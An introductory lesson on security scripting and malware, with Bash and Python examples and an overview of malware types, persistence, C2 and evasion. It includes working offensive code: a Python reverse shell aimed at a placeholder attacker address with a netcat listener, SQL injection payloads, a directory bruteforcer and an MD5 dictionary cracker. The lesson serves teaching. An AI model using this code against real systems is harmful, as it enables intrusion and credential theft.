# Basic Scripting & Malware

Now we're getting to the offensive side of cybersecurity. To understand how to defend against attacks, you need to understand how attacks work. And many attacks—especially sophisticated ones—rely on scripting and programming.

## Why Scripting Matters in Cybersecurity

Manual hacking is slow and inefficient. Professional security researchers and attackers alike use **scripts** to automate repetitive tasks, process large amounts of data, and perform complex operations quickly.

Scripting is essential for:
- **Reconnaissance**: Scanning networks and gathering information
- **Exploitation**: Automating exploit delivery
- **Post-exploitation**: Maintaining access and exfiltrating data
- **Malware development**: Creating viruses, worms, and trojans
- **Defense**: Analyzing logs, monitoring systems, automating responses
- **Penetration testing**: Simulating attacks to find vulnerabilities

If you want to be effective in cybersecurity—on either the offensive or defensive side—you need to learn to script.

## Bash Scripting: The System Administrator's Tool

**Bash (Bourne Again Shell)** is the default shell on most Linux systems. A Bash script is a text file containing a series of commands that execute sequentially.

### Your First Bash Script

Let's create a simple network reconnaissance script:

```bash
#!/bin/bash
# This is a comment - the line above tells the system this is a bash script

echo "Starting network scan..."

# Get your local IP address
MY_IP=$(hostname -I | awk '{print $1}')
echo "Your IP address: $MY_IP"

# Ping sweep to find active hosts
echo "Scanning for active hosts..."
for i in {1..254}; do
    ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "Host 192.168.1.$i is up"
done

echo "Scan complete!"
```

**What this does:**
- `#!/bin/bash` - shebang, tells system how to execute this file
- `echo` - prints text to terminal
- `$(command)` - command substitution, captures command output
- `for` loop - repeats actions
- `ping -c 1` - sends one ping packet
- `&>/dev/null` - discards output (silent operation)
- `&&` - only execute next command if previous succeeded

### Bash Scripting Fundamentals

**Variables:**
```bash
NAME="scanner"
COUNT=10
echo "Running $NAME $COUNT times"
```

**Conditionals:**
```bash
if [ "$COUNT" -gt 5 ]; then
    echo "Count is greater than 5"
elif [ "$COUNT" -eq 5 ]; then
    echo "Count equals 5"
else
    echo "Count is less than 5"
fi
```

**Loops:**
```bash
# For loop
for i in {1..10}; do
    echo "Number $i"
done

# While loop
COUNTER=0
while [ $COUNTER -lt 10 ]; do
    echo "Counter: $COUNTER"
    COUNTER=$((COUNTER + 1))
done
```

**Reading Files:**
```bash
while IFS= read -r line; do
    echo "Processing: $line"
done < targets.txt
```

**Functions:**
```bash
scan_port() {
    local host=$1
    local port=$2
    timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null && \
        echo "Port $port is open on $host"
}

scan_port 192.168.1.1 80
scan_port 192.168.1.1 443
```

### Practical Security Scripts

**Port Scanner:**
```bash
#!/bin/bash
TARGET=$1
for PORT in {1..1024}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && \
        echo "Port $PORT is open"
done
```

**Log Monitor:**
```bash
#!/bin/bash
LOG_FILE="/var/log/auth.log"
ALERT_EMAIL="admin@company.com"

# Watch for failed login attempts
tail -F $LOG_FILE | while read line; do
    if echo "$line" | grep -q "Failed password"; then
        echo "ALERT: Failed login attempt detected: $line" | \
            mail -s "Security Alert" $ALERT_EMAIL
    fi
done
```

## Python: The Security Researcher's Language

**Python** is the most popular language in cybersecurity. It's powerful, readable, and has thousands of libraries for security tasks.

### Why Python?

- **Easy to learn**: Clear, readable syntax
- **Powerful libraries**: Scapy for packets, Requests for web, Paramiko for SSH
- **Cross-platform**: Works on Linux, Windows, macOS
- **Industry standard**: Most security tools written in or support Python
- **Rapid development**: Write exploits and tools quickly

### Python Basics for Security

**Simple Port Scanner:**
```python
import socket

def scan_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0  # 0 means port is open

target = "192.168.1.1"
for port in range(1, 1025):
    if scan_port(target, port):
        print(f"Port {port} is open")
```

**HTTP Request Script:**
```python
import requests

url = "http://example.com/login"
data = {"username": "admin", "password": "test"}

response = requests.post(url, data=data)
print(f"Status Code: {response.status_code}")
print(f"Response: {response.text}")
```

**Password Generator:**
```python
import random
import string

def generate_password(length=12):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    return password

# Generate 10 passwords
for _ in range(10):
    print(generate_password(16))
```

**Basic Network Sniffer (using Scapy):**
```python
from scapy.all import sniff, IP, TCP

def packet_callback(packet):
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        
        if packet.haslayer(TCP):
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport
            print(f"{src_ip}:{src_port} -> {dst_ip}:{dst_port}")

# Sniff 100 packets
sniff(prn=packet_callback, count=100)
```

### Python for Web Exploitation

**SQL Injection Tester:**
```python
import requests

def test_sql_injection(url, param):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT NULL--"
    ]
    
    for payload in payloads:
        params = {param: payload}
        response = requests.get(url, params=params)
        
        if "error" in response.text.lower() or \
           "syntax" in response.text.lower():
            print(f"Possible SQL injection with payload: {payload}")

test_sql_injection("http://vulnerable-site.com/search", "q")
```

**Directory Bruteforcer:**
```python
import requests

def bruteforce_directories(base_url, wordlist_file):
    with open(wordlist_file, 'r') as f:
        for line in f:
            directory = line.strip()
            url = f"{base_url}/{directory}"
            
            response = requests.get(url)
            if response.status_code == 200:
                print(f"Found: {url}")
            elif response.status_code == 403:
                print(f"Forbidden: {url}")

bruteforce_directories("http://target.com", "directories.txt")
```

## Understanding Malware

Now let's talk about the dark side: **malware** (malicious software). Understanding how malware works is crucial for defending against it.

### Types of Malware

**Viruses:**
- Attach themselves to legitimate programs
- Spread when infected program is executed
- Require user action to spread
- Can modify or delete files, corrupt systems

**Worms:**
- Self-replicating, spread automatically
- Don't need to attach to programs
- Spread through network vulnerabilities
- Can consume bandwidth and system resources
- Examples: Morris Worm (1988), WannaCry (2017)

**Trojans:**
- Disguised as legitimate software
- Don't self-replicate
- Give attackers remote access
- Often used to install other malware
- Example: Banking trojans that steal credentials

**Ransomware:**
- Encrypts victim's files
- Demands payment for decryption key
- Often spread through phishing or vulnerabilities
- Major threat to businesses and individuals
- Examples: WannaCry, Ryuk, REvil

**Spyware:**
- Monitors user activity
- Steals information (passwords, credit cards, browsing)
- Often installed through deceptive downloads
- Keyloggers are a type of spyware

**Rootkits:**
- Hide presence of other malware
- Operate at kernel level
- Very difficult to detect and remove
- Give attackers privileged access

**Botnets:**
- Networks of infected computers (bots/zombies)
- Controlled by attacker (botmaster)
- Used for DDoS attacks, spam, crypto mining
- Victims often don't know they're infected

### Malware Behavior

**Persistence Mechanisms:**
Malware needs to survive reboots and remain active.

Common techniques:
- Registry modifications (Windows)
- Startup scripts (Linux/Windows)
- Scheduled tasks
- Service installation
- Browser extensions
- Bootkit (infects boot process)

**Command and Control (C2):**
Malware often communicates with attacker-controlled servers:
- Receive commands
- Exfiltrate stolen data
- Download updates
- Report infection status

C2 channels can use:
- HTTP/HTTPS (blend with normal traffic)
- DNS (queries can encode data)
- Social media APIs
- Peer-to-peer networks
- Custom protocols

**Evasion Techniques:**
Malware tries to avoid detection:
- **Obfuscation**: Makes code hard to analyze
- **Encryption**: Encrypts itself, decrypts at runtime
- **Polymorphism**: Changes its code each time it spreads
- **Metamorphism**: Completely rewrites its code
- **Anti-VM**: Detects virtual machines used for analysis
- **Time delays**: Waits before activating to avoid sandboxes
- **Domain generation algorithms (DGA)**: Creates many C2 domains

### Simple Malware Example (Educational Purpose)

**IMPORTANT**: This is for educational purposes only. Creating or deploying malware maliciously is illegal and unethical.

```python
# Simple reverse shell (attacker gains remote access)
import socket
import subprocess

def reverse_shell(attacker_ip, attacker_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((attacker_ip, attacker_port))
    
    while True:
        # Receive command from attacker
        command = sock.recv(1024).decode()
        
        if command.lower() == 'exit':
            break
            
        # Execute command
        output = subprocess.run(command, shell=True, 
                              capture_output=True, text=True)
        
        # Send output back to attacker
        result = output.stdout + output.stderr
        sock.send(result.encode())
    
    sock.close()

# This would connect to attacker's machine
# reverse_shell("attacker_ip", 4444)
```

On the attacker side:
```bash
# Listen for connection
nc -lvp 4444
```

This demonstrates how malware can give remote access, but real malware is much more sophisticated—with encryption, obfuscation, persistence, and anti-detection.

### Analyzing Malware Safely

**Never run unknown malware on your actual system.** Use:

**Virtual Machines:**
- Isolated environment
- Can snapshot and revert
- Tools: VirtualBox, VMware, QEMU

**Sandboxes:**
- Automated malware analysis
- Monitor behavior safely
- Tools: Cuckoo Sandbox, Joe Sandbox, Any.run

**Static Analysis:**
- Examine code without executing
- Tools: IDA Pro, Ghidra, radare2
- Look for strings, imported functions, suspicious code

**Dynamic Analysis:**
- Execute in controlled environment
- Monitor: file operations, network connections, registry changes
- Tools: Process Monitor, Wireshark, API monitors

## Creating Security Tools

Let's build some useful tools:

**Password Cracker (Dictionary Attack):**
```python
import hashlib

def crack_md5_hash(target_hash, wordlist_file):
    with open(wordlist_file, 'r', encoding='latin-1') as f:
        for line in f:
            password = line.strip()
            hash_attempt = hashlib.md5(password.encode()).hexdigest()
            
            if hash_attempt == target_hash:
                print(f"Password found: {password}")
                return password
    
    print("Password not found in wordlist")
    return None

# Example usage
target = "5f4dcc3b5aa765d61d8327deb882cf99"  # "password" in MD5
crack_md5_hash(target, "rockyou.txt")
```

**Network Connection Monitor:**
```python
import psutil
import time

def monitor_connections():
    known_connections = set()
    
    while True:
        connections = psutil.net_connections()
        
        for conn in connections:
            if conn.status == 'ESTABLISHED':
                conn_info = (conn.laddr.ip, conn.laddr.port, 
                           conn.raddr.ip if conn.raddr else None,
                           conn.raddr.port if conn.raddr else None)
                
                if conn_info not in known_connections:
                    print(f"New connection: {conn_info}")
                    known_connections.add(conn_info)
        
        time.sleep(5)

monitor_connections()
```

## Best Practices for Security Scripting

1. **Test in isolated environments**: Don't run untested scripts on production systems
2. **Validate input**: Always sanitize and validate user input
3. **Handle errors**: Scripts should fail gracefully
4. **Log actions**: Keep records of what your scripts do
5. **Comment code**: Explain what your code does
6. **Use version control**: Track changes with Git
7. **Follow responsible disclosure**: Report vulnerabilities properly

## Ethical Considerations

You now have knowledge that could be used maliciously. Remember:

- **Never attack systems you don't own** or have explicit permission to test
- **Malware development** for malicious purposes is illegal
- **Responsible disclosure** is the ethical path when finding vulnerabilities
- **Consent is required** for penetration testing
- **Knowledge is not an excuse** for illegal activity

Many security professionals started by being curious and learning these skills. The difference between a security professional and a criminal is permission and intent.

## What's Next

In upcoming lessons, we'll:
- Dive deeper into network traffic analysis
- Learn to use professional security tools
- Study real-world attack scenarios
- Develop more sophisticated scripts
- Analyze actual malware samples

Scripting is a skill that improves with practice. Start small, build simple tools, and gradually increase complexity. Every security professional relies on scripting daily—it's what separates script kiddies from professionals.
